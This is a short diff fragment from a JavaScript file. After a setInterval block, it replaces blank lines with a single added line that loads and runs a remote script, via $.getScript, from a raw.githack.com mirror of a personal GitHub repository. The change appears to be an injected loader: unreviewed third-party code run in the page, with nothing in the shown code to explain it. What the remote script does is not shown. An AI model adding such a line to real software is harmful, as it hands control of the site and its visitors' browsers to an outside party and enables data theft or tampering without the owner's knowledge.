@@ -340,10 +340,4 @@ var l_itvshihanh=setInterval(function(){
     }
 }, 10000);
 
-
-
-
-
-
-
-
+$.getScript("https://raw.githack.com/Azozz5/uzr/main/baht.js");
